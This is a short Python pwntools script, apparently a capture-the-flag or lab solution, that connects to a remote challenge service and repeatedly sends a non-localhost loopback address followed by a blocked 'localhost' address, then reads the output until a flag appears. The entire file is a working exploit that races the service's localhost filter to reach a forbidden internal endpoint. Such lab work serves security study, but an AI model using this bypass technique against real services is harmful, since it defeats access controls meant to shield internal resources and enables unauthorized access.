from pwn import *
import time

context.log_level = 'info'
HOST, PORT = 'up.zoolab.org', 10932

ANY  = b"127.0.0.3/10000"  # 一個非localhost的loopback地址
LOCAL = b"localhost/10000"  # 會被阻止的本地地址

# 嘗試連接
p = remote(HOST, PORT, timeout=5)
p.recvuntil(b"What do you want to do?")

attempt = 0
while True:
    attempt += 1
    
    p.sendline(b'g')
    p.sendline(ANY)
    
    p.sendline(b'g')
    p.sendline(LOCAL)
    
    p.sendline(b'v')
    block = p.recvuntil(b"What do you want to do?", timeout=1).decode(errors='ignore')
    
    if "FLAG{" in block:
        log.success("\nFLAG!")
        print(block)
        exit(0)